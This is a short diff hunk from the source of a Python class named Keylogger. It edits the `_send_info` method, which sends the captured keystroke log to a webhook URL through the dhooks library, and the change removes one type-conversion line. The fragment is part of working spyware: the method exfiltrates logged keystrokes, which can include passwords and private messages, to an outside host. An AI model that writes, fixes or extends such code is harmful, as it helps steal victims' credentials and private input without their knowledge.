@@ -14,7 +14,6 @@ class Keylogger:
         self.log = ""
 
     def _send_info(self, log):
-        log = str(log)
         if log != "":
             webhook = dhooks.Webhook(self.WB_URL)
             webhook.send(log)
